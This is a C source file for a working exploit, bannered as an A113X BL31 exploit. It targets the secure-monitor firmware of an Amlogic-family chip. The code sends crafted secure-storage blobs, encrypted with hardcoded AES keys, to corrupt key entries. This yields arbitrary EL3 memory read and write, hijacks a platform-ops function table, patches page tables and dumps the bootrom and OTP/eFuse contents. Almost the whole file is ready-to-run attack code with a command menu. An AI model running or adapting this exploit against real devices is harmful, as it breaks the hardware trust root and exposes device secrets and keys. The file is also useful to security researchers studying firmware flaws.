#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>

#include "aes.h"
#include "sha256.h"

#define DEBUGFS_PATH "/sys/kernel/debug/hax"

#define SMC_ID_STORAGE_PARSE 0x82000069
#define SMC_ID_STORAGE_READ 0x82000061
#define SMC_ID_STORAGE_WRITE 0x82000062

#define TYPE_PARAM_HEADER 1
#define TYPE_ENCRYPTED_SIZE 2
#define TYPE_KEY_DEFINITION 3
#define TYPE_NAME_SIZE 4
#define TYPE_NAME_DATA 5
#define TYPE_VALUE_SIZE 6
#define TYPE_VALUE_DATA 7
#define TYPE_KEY_TYPE 8
#define TYPE_BUFFER_STATUS 9
#define TYPE_HASH_DATA 10
#define TYPE_UNKNOWN 11

#define F_EFUSE_READ 0x5119994

#define OTP_SIZE 0x100
#define BOOTROM_SIZE 0x8000

#define UPAT 4UL
#define LPAT 0x181UL

#define HEAP_HEAD 0x517E8E8
#define PLATFORM_OPS_PTR 0x51BFC18
#define FAKE_PLATFORM_OPS_ADDR (HEAP_HEAD + 0x20000)

#define TTBR0_EL3 0x51BF980

typedef unsigned char u8;
typedef unsigned int u32;
typedef unsigned long u64;

uint64_t call_smc(u32 a, u64 b, u64 c, u64 d)
{
    uint64_t rv = 0;
    FILE *f = fopen(DEBUGFS_PATH "/smc", "w");
    if (f == NULL)
    {
        printf("could not open smc\n");
        exit(-1);
    }

    fprintf(f, "%x %lx %lx %lx\n", a, b, c, d);
    fclose(f);

    f = fopen(DEBUGFS_PATH "/smc", "rb");
    if (f == NULL)
    {
        printf("could not open smc\n");
        exit(-1);
    }

    read(fileno(f), &rv, 8);
    fclose(f);

    return rv;
}

static inline void uart_put_hex(unsigned int data, unsigned bitlen)
{
    int i;
    unsigned char s;
    for (i = bitlen - 4; i >= 0; i -= 4)
    {
        if ((data >> i) == 0)
        {
            putc(0x30, stdout);
            continue;
        }
        s = (data >> i) & 0xf;
        if (s < 10)
            putc(0x30 + s, stdout);
        else
            putc(0x61 + s - 10, stdout);
    }
}

void hexdump(void *ptr, int buflen)
{
    unsigned char *buf = (unsigned char *)ptr;
    int i, j;
    for (i = 0; i < buflen; i += 16)
    {
        printf("%p: ", (ptr + i));
        putc(':', stdout);
        putc(' ', stdout);
        for (j = 0; j < 16; j++)
        {
            if (i + j < buflen)
            {
                uart_put_hex(buf[i + j], 8);
                putc(' ', stdout);
            }
            else
            {
                putc(' ', stdout);
                putc(' ', stdout);
                putc(' ', stdout);
            }
        }
        putc(' ', stdout);
        for (j = 0; j < 16; j++)
        {
            if (i + j < buflen)
            {
                if (buf[i + j] >= 0x20 && buf[i + j] <= 0x7e)
                {
                    putc(buf[i + j], stdout);
                }
                else
                {
                    putc('.', stdout);
                }
            }
        }
        putc('\n', stdout);
    }
}

void w32(u8 *p, u32 v)
{
    p[0] = (v & 0xff);
    p[1] = (v >> 8) & 0xff;
    p[2] = (v >> 16) & 0xff;
    p[3] = (v >> 24) & 0xff;
}

u32 key_entry(u8 *o, u8 *name, u8 *data, u32 data_len)
{
    u8 *so = o;
    u8 hash[32];

    memset(hash, 0, sizeof(hash));

    SHA256_CTX sha256_ctx;
    sha256_init(&sha256_ctx);
    sha256_update(&sha256_ctx, data, data_len);
    sha256_final(&sha256_ctx, hash);

    u32 sz =
        12 +             // TYPE_VALUE_SIZE
        (8 + data_len) + // TYPE_VALUE_DATA
        (8 + 32);        // TYPE_HASH_DATA

    if (name != (u8 *)0)
    {
        // TYPE_NAME_SIZE + TYPE_NAME_DATA
        sz += 12 + (8 + strlen(name));
    }

    w32(o + 0, 0x3);
    w32(o + 4, sz);
    o += 8;

    if (name != (u8 *)0)
    {
        w32(o + 0, TYPE_NAME_SIZE);
        w32(o + 4, 4);
        w32(o + 8, strlen(name));
        o += 12;

        w32(o + 0, TYPE_NAME_DATA);
        w32(o + 4, strlen(name));
        for (int i = 0; i < strlen(name); i++)
        {
            o[8 + i] = name[i];
        }
        o += 8 + strlen(name);
    }

    w32(o + 0, TYPE_VALUE_SIZE);
    w32(o + 4, 4);
    w32(o + 8, data_len);
    o += 12;

    w32(o + 0, TYPE_VALUE_DATA);
    w32(o + 4, data_len);
    memcpy(o + 8, data, data_len);
    o += 8 + data_len;

    w32(o + 0, TYPE_HASH_DATA);
    w32(o + 4, 0x20);
    memcpy(o + 8, hash, 0x20);
    o += 8 + 32;

    return (u32)((o - so) & 0xffffffff);
}

void aes256_cbc_encrypt(u8 *key, u8 *iv, u8 *buffer, uint32_t size)
{
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_encrypt_buffer(&ctx, buffer, size);
}

void fixed_encrypt(u8 *buffer, uint32_t size)
{
    static u8 key[] = {
        0xb3, 0xd3, 0x24, 0x8f, 0x6e, 0x34, 0x0c, 0x8b,
        0xca, 0xb6, 0x3f, 0x10, 0x77, 0x87, 0x5d, 0xee,
        0x9d, 0x93, 0x1d, 0x76, 0xd0, 0xd8, 0x5e, 0x98,
        0x1c, 0xf0, 0x21, 0x43, 0x8f, 0x24, 0xb6, 0x15};

    static u8 iv[] = {
        0xab, 0x75, 0x0d, 0xc4, 0x3e, 0x28, 0x40, 0xa7,
        0xf9, 0x88, 0xea, 0xd7, 0xbe, 0x30, 0xe7, 0x01};

    aes256_cbc_encrypt(key, iv, buffer, size);
}

void storage_encrypt(u8 *buffer, uint32_t size)
{
    static u8 key[] = {
        0x13, 0x22, 0x02, 0x4a, 0x55, 0x23, 0xbb, 0xcb,
        0xf1, 0xfb, 0x2a, 0xcc, 0xbb, 0x95, 0xf4, 0x50,
        0xae, 0x08, 0xd7, 0xfb, 0x80, 0xf2, 0x64, 0x72,
        0xe3, 0x3c, 0xc4, 0xb4, 0xa3, 0x50, 0xd9, 0xf1};

    static u8 iv[] = {
        0x2a, 0xde, 0xfc, 0xd7, 0x67, 0xc8, 0xde, 0xd0,
        0xf0, 0x1e, 0xe8, 0x12, 0xf9, 0x57, 0x25, 0x36};

    aes256_cbc_encrypt(key, iv, buffer, size);
}

void tlv32(uint8_t *o, uint32_t t, uint32_t l, uint32_t v)
{
    *(uint32_t *)(o + 0) = t;
    *(uint32_t *)(o + 4) = l;
    *(uint32_t *)(o + 8) = v;
}

void build_hax_storage_header(u8 *out, uint32_t encrypted_size)
{
    u8 *p_hdr = out + 0;
    u8 *p_param = out + 0x200;

    static u8 magic[11] = {
        'A', 'M', 'L', 'S', 'E', 'C', 'U', 'R', 'I', 'T', 'Y'};

    // build plaintext header
    memset(p_hdr, 0, 0x200);
    memcpy(p_hdr, magic, sizeof(magic));
    w32(p_hdr + 0x10, 0); // key version, 0 = skip sha256 of body
    w32(p_hdr + 0x14, 2); // seed mode, 2 uses the hardcoded key.

    // build plaintext param block
    memset(p_param, 0, 0x200);
    w32(p_param + 0x00, TYPE_PARAM_HEADER);
    w32(p_param + 0x04, 24); // 24 = size of next two TLVs

    w32(p_param + 0x08, TYPE_ENCRYPTED_SIZE);
    w32(p_param + 0x0c, 4);
    w32(p_param + 0x10, encrypted_size);

    w32(p_param + 0x14, TYPE_UNKNOWN);
    w32(p_param + 0x18, 4);
    w32(p_param + 0x1c, 0);

    // encrypt param block
    storage_encrypt(p_param, 0x200);
}

void build_hax_storage_header2(u8 *out, uint8_t *paramdata, size_t paramdata_len)
{
    u8 *p_hdr = out + 0;
    u8 *p_param = out + 0x200;

    static u8 magic[11] = {
        'A', 'M', 'L', 'S', 'E', 'C', 'U', 'R', 'I', 'T', 'Y'};

    // build plaintext header
    memset(p_hdr, 0, 0x200);
    memcpy(p_hdr, magic, sizeof(magic));
    w32(p_hdr + 0x10, 0); // key version, 0 = skip sha256 of body
    w32(p_hdr + 0x14, 2); // seed mode, 2 uses the hardcoded key.

    // build plaintext param block
    memset(p_param, 0, 0x200);
    memcpy(p_param, paramdata, paramdata_len);

    // encrypt param block
    storage_encrypt(p_param, 0x200);
}

void clear_procfile(char *proc_file, size_t len)
{
    FILE *f = fopen(proc_file, "wb");
    if (f == NULL)
    {
        printf("could not open file: '%s'\n", proc_file);
        exit(-1);
    }
    uint8_t *buf = malloc(len);
    memset(buf, 0xaa, len);
    fwrite(buf, len, 1, f);
    fclose(f);
    free(buf);
}

void clear_procfiles()
{
    clear_procfile(DEBUGFS_PATH "/storage", 0x800);
    clear_procfile(DEBUGFS_PATH "/haxbuf", 0x800);
    clear_procfile(DEBUGFS_PATH "/input_a", 0x800);
    clear_procfile(DEBUGFS_PATH "/input_b", 0x800);
    clear_procfile(DEBUGFS_PATH "/output_a", 0x800);
    clear_procfile(DEBUGFS_PATH "/output_b", 0x800);
}

void write_procfile(char *proc_file, uint8_t *data, size_t len)
{
    FILE *f = fopen(proc_file, "wb");
    if (f == NULL)
    {
        printf("could not open file: '%s'\n", proc_file);
        exit(-1);
    }
    fwrite(data, len, 1, f);
    fclose(f);
}

void read_procfile(char *proc_file, uint8_t *data, size_t len)
{
    FILE *f = fopen(proc_file, "rb");
    if (f == NULL)
    {
        printf("could not open file: '%s'\n", proc_file);
        exit(-1);
    }
    fread(data, len, 1, f);
    fclose(f);
}

void write_storage(uint8_t *data, size_t len)
{
    write_procfile(DEBUGFS_PATH "/storage", data, len);
}

void write_haxbuf(uint8_t *data, size_t len)
{
    write_procfile(DEBUGFS_PATH "/haxbuf", data, len);
}

void write_input_b(uint8_t *data, size_t len)
{
    write_procfile(DEBUGFS_PATH "/input_b", data, len);
}

void write_input_a(uint8_t *data, size_t len)
{
    write_procfile(DEBUGFS_PATH "/input_a", data, len);
}

void read_output_b(uint8_t *data, size_t len)
{
    read_procfile(DEBUGFS_PATH "/output_b", data, len);
}

uint64_t read64(uint64_t addr)
{
    uint8_t scratch[0x2000];
    uint8_t *pp;
    uint8_t *pp_o;

    pp = scratch + 0x400;
    pp_o = pp;

    for (int i = 0; i < 65; i++)
    {
        pp += key_entry(pp, "AAAA", "BBB", 4);
    }

    pp += key_entry(pp, "XXXX", "CCC", 4);
    storage_encrypt(pp_o, ((pp - pp_o) + 15) & 0xfffffff0);
    build_hax_storage_header(scratch, pp - pp_o);
    write_storage(scratch, sizeof(scratch));

    uint64_t rv = call_smc(SMC_ID_STORAGE_PARSE, 0x40000, 0, 0);

    u8 fake_key[0x90 * 2];

    // overwrite key entry 33+34 using broken parse
    memset(fake_key, 0, sizeof(fake_key));
    for (int i = 0; i < 2; i++)
    {
        memcpy(fake_key + (i * 0x90), "XXXX", 4);
        w32(fake_key + (i * 0x90) + 0x50, 4);    // name_len
        w32(fake_key + (i * 0x90) + 0x5c, 8);    // value_size
        w32(fake_key + (i * 0x90) + 0x60, addr); // value_ptr
        w32(fake_key + (i * 0x90) + 0x88, 1);    // key_in_use
    }

    build_hax_storage_header2(scratch, fake_key + 8, sizeof(fake_key) - 8);
    write_storage(scratch, sizeof(scratch));

    rv = call_smc(SMC_ID_STORAGE_PARSE, 0x40000, 0, 0);

    // read key 'XXXX'
    tlv32(scratch, 4, 0x100, 0x58585858);
    write_input_b(scratch, 0x10);
    rv = call_smc(SMC_ID_STORAGE_READ, 0, 0, 0);

    read_output_b(scratch, 12);
    if (*(uint32_t *)(scratch) != 8)
    {
        printf("read64: error! %x\n", *(uint32_t *)(scratch));
        exit(-1);
    }

    return *(uint64_t *)(scratch + 4);
}

void write64(uint64_t addr, uint64_t value)
{
    uint8_t scratch[0x2000];
    uint8_t *pp;
    uint8_t *pp_o;

    pp = scratch + 0x400;
    pp_o = pp;

    for (int i = 0; i < 65; i++)
    {
        pp += key_entry(pp, "AAAA", "BBB", 4);
    }

    pp += key_entry(pp, "XXXX", "CCC", 4);
    storage_encrypt(pp_o, ((pp - pp_o) + 15) & 0xfffffff0);
    build_hax_storage_header(scratch, pp - pp_o);
    write_storage(scratch, sizeof(scratch));

    uint64_t rv = call_smc(SMC_ID_STORAGE_PARSE, 0x40000, 0, 0);

    u8 fake_key[0x90 * 2];

    // overwrite key entry 64+65 using broken parse
    memset(fake_key, 0, sizeof(fake_key));
    for (int i = 0; i < 2; i++)
    {
        memcpy(fake_key + (i * 0x90), "XXXX", 4);
        w32(fake_key + (i * 0x90) + 0x50, 4);    // name_len
        w32(fake_key + (i * 0x90) + 0x5c, 8);    // value_size
        w32(fake_key + (i * 0x90) + 0x60, addr); // value_ptr
        w32(fake_key + (i * 0x90) + 0x88, 1);    // key_in_use
    }

    build_hax_storage_header2(scratch, fake_key + 8, sizeof(fake_key) - 8);
    write_storage(scratch, sizeof(scratch));

    rv = call_smc(SMC_ID_STORAGE_PARSE, 0x40000, 0, 0);

    pp = scratch;

    w32(pp + 0x00, 0x4);   // name_len
    w32(pp + 0x04, 0x8); // value_size
    w32(pp + 0x08, 0x0);   // buffer_status
    memcpy(pp + 0x0c, "XXXX", 4);
    w32(pp + 0x10, value & 0xffffffff);
    w32(pp + 0x14, (value >> 32) & 0xffffffff);
    write_input_b(scratch, 0x20);
    rv = call_smc(SMC_ID_STORAGE_WRITE, 0, 0, 0);
}


void call3(u64 addr, u64 a, u64 b, u64 c)
{
    // install hacked platform ops table
    uint64_t platform_op_table[72] = {
        0x000000000511a59c, // 0
        0x000000000511a5b4, // 1
        0x000000000511a5a8, // 2
        0x000000000511a5c0, // 3
        0x0000000005120348, // 4
        0x0000000005120350, // 5
        0x0000000005120358, // 6
        0x0000000005120360, // 7
        0x0000000005120368, // 8
        0x0000000005120370, // 9
        0x0000000005120378, // 10
        0x000000000511a5cc, // 11
        0x000000000511a5e4, // 12
        0x0000000000000000, // 13
        0x0000000000000000, // 14
        0x0000000000000000, // 15
        0x000000000511a874, // 16
        0x000000000511a8d4, // 17
        0x000000000511e30c, // 18
        0x000000000511e36c, // 19
        0x000000000511e5c4, // 20
        0x000000000511a5f8, // 21
        0x0000000005120cf4, // 22
        0x0000000005120d20, // 23
        0x0000000005120d54, // 24
        0x0000000005120d78, // 25
        0x0000000005120d9c, // 26
        0x0000000005120dc0, // 27
        0x0000000005120de4, // 28
        0x0000000005120dec, // 29
        0x0000000005120e04, // 30
        0x0000000005120e1c, // 31
        0x0000000000000000, // 32
        0x0000000000000000, // 33
        0x0000000000000000, // 34
        0x0000000000000000, // 35
        0x0000000000000000, // 36
        0x0000000000000000, // 37
        0x0000000000000000, // 38
        0x0000000000000000, // 39
        0x0000000000000000, // 40
        0x0000000000000000, // 41
        0x0000000000000000, // 42
        0x0000000000000000, // 43
        0x0000000000000000, // 44
        0x000000000511a624, // 45
        0x000000000511a684, // 46
        0x0000000005119dcc, // 47
        0x0000000005119e6c, // 48
        0x0000000000000000, // 49
        0x0000000000000000, // 50
        0x0000000000000000, // 51
        0x0000000000000000, // 52
        0x0000000000000000, // 53
        0x0000000005119ed0, // 54
        0x0000000005120e3c, // 55
        0x0000000005120e40, // 56
        0x0000000005120e44, // 57
        0x0000000005119be0, // 58
        0x000000000511ac70, // 59
        0x000000000511a908, // 60
        0x0000000005121250, // 61
        0x000000000511af68, // 62
        0x000000000512157c, // 63
        0x0000000005121794, // 64
        0x00000000051218dc, // 65
        0x0000000005121930, // 66
        0x0000000005121a18, // 67
        0x0000000005121bf4, // 68
        0x0000000005121d50, // 69
        0x0000000005122248, // 70
        0x0000000005122400, // 71
    };

    // 0x820000FF
    platform_op_table[18] = addr;

    for (int i = 0; i < 72; i++)
    {
        write64(FAKE_PLATFORM_OPS_ADDR + (i * 8), platform_op_table[i]);
    }

    write64(PLATFORM_OPS_PTR, FAKE_PLATFORM_OPS_ADDR);

    call_smc(0x820000FF, a, b, c);
}


void dump_otp(char *outputfile) {
    printf("[+] clearing scratch..\n");
    for (int i = 0; i < OTP_SIZE; i += 8)
    {
        write64(HEAP_HEAD + 0x30000 + i, 0);
    }

    printf("[+] trigger OTP read..\n");
    call3(F_EFUSE_READ, HEAP_HEAD + 0x30000, 0, 0x100);

    uint8_t otp[OTP_SIZE];
    memset(otp, 0, sizeof(otp));

    printf("[+] slurping OTP data..\n");
    for (int i = 0; i < OTP_SIZE; i += 8)
    {
        *(uint64_t *)(otp + i) = read64(HEAP_HEAD + 0x30000 + i);
    }

    hexdump(otp, OTP_SIZE);

    FILE *f = fopen(outputfile, "wb");
    fwrite(otp, OTP_SIZE, 1, f);
    fclose(f);
}

void dump_bootrom(uint64_t ttbr0_el3, char *outputfile) {
    uint64_t l2_addr = read64(ttbr0_el3 + 0x18);
    l2_addr &= ~3;

    printf("[+] L2 table for c0000000-ffffffff @ %016lx\n", l2_addr);

    uint64_t l3_addr = read64(l2_addr + (0x1ff * 8));
    l3_addr &= ~3;

    printf("[+] L3 table for ffe00000-ffffffff @ %016lx\n", l3_addr);

    uint64_t tbl_start = 0xffe00000;
    uint64_t map_start = 0xffff0000;
    uint64_t map_end = map_start + (1024 * 64);

    printf("[+] patching pagetable to facilitate bootrom dumping..\n");
    for(uint64_t addr = map_start; addr < map_end; addr += 0x1000) {
        uint32_t index = (addr - tbl_start) / 0x1000;
        uint64_t entry = (addr & 0xfffff000) | (UPAT << 52) | (LPAT << 2) | 3;
        write64(l3_addr + (index * 8), entry);
    }
    printf("[+] done\n");

    FILE *f = fopen(outputfile, "wb");
    printf("[+] dumping bootrom..\n");
    for(uint64_t addr = map_start; addr < (map_start + BOOTROM_SIZE); addr += 8) {
        if ((addr % 0x100) == 0) {
            printf("> pos: %016lx\n", addr);
        }
        uint64_t v = read64(addr);
        fwrite(&v, 8, 1, f);
    }
    printf("[+] done!\n");
    fclose(f);
}

void banner() {
    printf("\n*** A113X BL31 exploit by blasty <peter@haxx.in> ***\n\n");
}

void usage(char *prog) {
    printf(
        "usage:\n"
        "  %s dump_otp <output.bin>\n"
        "  %s dump_bootrom <TTBR0_EL3> <output.bin>\n"
        "  %s read64 <address>\n"
        "  %s write64 <address> <value>\n"
        "\n",
        prog, prog, prog, prog
    );
}

int main(int argc, char *argv[])
{
    banner();

    if (argc < 3) {
        usage(argv[0]);
        return -1;
    }

    clear_procfiles();

    if(!strcmp(argv[1], "dump_otp")) {
        dump_otp(argv[2]);
    } else if (!strcmp(argv[1], "dump_bootrom")) {
        uint64_t ttbr0_el3 = TTBR0_EL3;
        dump_bootrom(ttbr0_el3, argv[2]);
    } else if (!strcmp(argv[1], "read64")) {
        uint64_t a = strtoull(argv[2], NULL, 0);
        uint64_t v = read64(a);
        printf("read64 0x%016lx = 0x%016lx\n", a, v);
    } else if (!strcmp(argv[1], "write64")) {
        if (argc != 4) {
            usage(argv[0]);
            return -1;
        }
        uint64_t a = strtoull(argv[2], NULL, 0);
        uint64_t v = strtoull(argv[3], NULL, 0);
        write64(a, v);
        printf("write64 0x%016lx = 0x%016lx done\n", a, v);
    } else {
        usage(argv[0]);
        return -1;
    }

    return 0;
}
